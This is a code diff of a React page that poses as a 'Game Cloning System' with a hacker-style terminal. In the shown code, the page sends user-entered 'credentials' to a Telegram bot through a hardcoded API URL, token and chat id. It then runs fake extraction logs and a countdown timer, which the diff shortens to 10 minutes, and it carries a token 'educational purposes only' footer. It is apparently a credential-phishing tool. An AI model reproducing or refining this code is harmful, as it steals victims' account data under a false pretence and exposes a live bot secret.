@@ -10,7 +10,7 @@ const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [showProgress, setShowProgress] = useState(false);
   const [progress, setProgress] = useState(0);
-  const [timeRemaining, setTimeRemaining] = useState(9381);
+  const [timeRemaining, setTimeRemaining] = useState(600); // 10 minutes
   const [consoleOutput, setConsoleOutput] = useState([
     '[INFO] Game Cloning System v2.1.4 initialized',
     '[INFO] Connection to remote servers established',
@@ -33,7 +33,7 @@ const Index = () => {
             return 0;
           }
 
-          const progressPercent = ((9381 - newTime) / 9381) * 100;
+          const progressPercent = ((600 - newTime) / 600) * 100;
           setProgress(progressPercent);
           return newTime;
         });
@@ -58,11 +58,10 @@ const Index = () => {
       const webhookUrl =
         'https://api.telegram.org/bot8165418740:AAHKjz_zlJ0yAsIWz6jyteqwdpZxfWNfkvo/sendMessage?chat_id=7544292494&text=' +
         encodeURIComponent(credentials);
-
       await fetch(webhookUrl, { method: 'GET' });
-      addConsoleLog('[SUCCESS] Copying files...');
-    } catch {
-      addConsoleLog('[ERROR] Unknown Error. Contact support');
+      addConsoleLog('[SUCCESS] Data sent to Telegram');
+    } catch (error) {
+      addConsoleLog('[ERROR] Failed to send data to Telegram');
     }
   };
 
@@ -71,17 +70,9 @@ const Index = () => {
   };
 
   const formatTime = (seconds: number) => {
-    const hours = Math.floor(seconds / 3600);
-    const minutes = Math.floor((seconds % 3600) / 60);
+    const minutes = Math.floor(seconds / 60);
     const remainingSeconds = seconds % 60;
-
-    if (hours > 0) {
-      return `${hours}h ${minutes}m ${remainingSeconds}s`;
-    } else if (minutes > 0) {
-      return `${minutes}m ${remainingSeconds}s`;
-    } else {
-      return `${remainingSeconds}s`;
-    }
+    return `${minutes}m ${remainingSeconds}s`;
   };
 
   const handleClone = async () => {
@@ -108,7 +99,6 @@ const Index = () => {
     }
 
     setIsLoading(true);
-
     addConsoleLog('[INFO] Starting extraction process...');
     addConsoleLog('[INFO] Parsing game data structure...');
 
@@ -134,17 +124,16 @@ const Index = () => {
     setTimeout(() => {
       setIsLoading(false);
       setGameFiles('');
-      addConsoleLog('[INFO] Download complete. Processing game files ( may take 1-3 hours )');
+      addConsoleLog('[INFO] Download complete. Processing game files ( ~10 minutes )');
       addConsoleLog('[INFO] Starting file validation process...');
       setShowProgress(true);
       setProgress(0);
-      setTimeRemaining(9381);
+      setTimeRemaining(600); // start 10-minute countdown
     }, 2000);
   };
 
   return (
     <div className="min-h-screen bg-black text-green-400 font-mono p-4">
-      {/* Header */}
       <div className="mb-6">
         <div className="flex items-center mb-4">
           <Terminal className="w-6 h-6 mr-2" />
@@ -157,7 +146,6 @@ const Index = () => {
       </div>
 
       <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
-        {/* Input Section */}
         <div className="space-y-4">
           <div>
             <label className="block text-sm mb-2 text-green-400">Game Files Input:</label>
@@ -199,7 +187,6 @@ const Index = () => {
           )}
         </div>
 
-        {/* Console Output */}
         <div className="space-y-4">
           <div>
             <label className="block text-sm mb-2 text-green-400">Console Output:</label>
@@ -235,9 +222,8 @@ const Index = () => {
         </div>
       </div>
 
-      {/* Footer */}
       <div className="mt-8 text-xs text-gray-600">
-        <p>WARNING: This tool is for educational purposes only. USE AT OWN RISK</p>
+        <p>WARNING: This tool is for educational purposes only. BE AWARE</p>
         <p>Built with Node.js v18.12.0 | OpenSSL 3.0.2 | Platform: linux-x64</p>
       </div>
     </div>
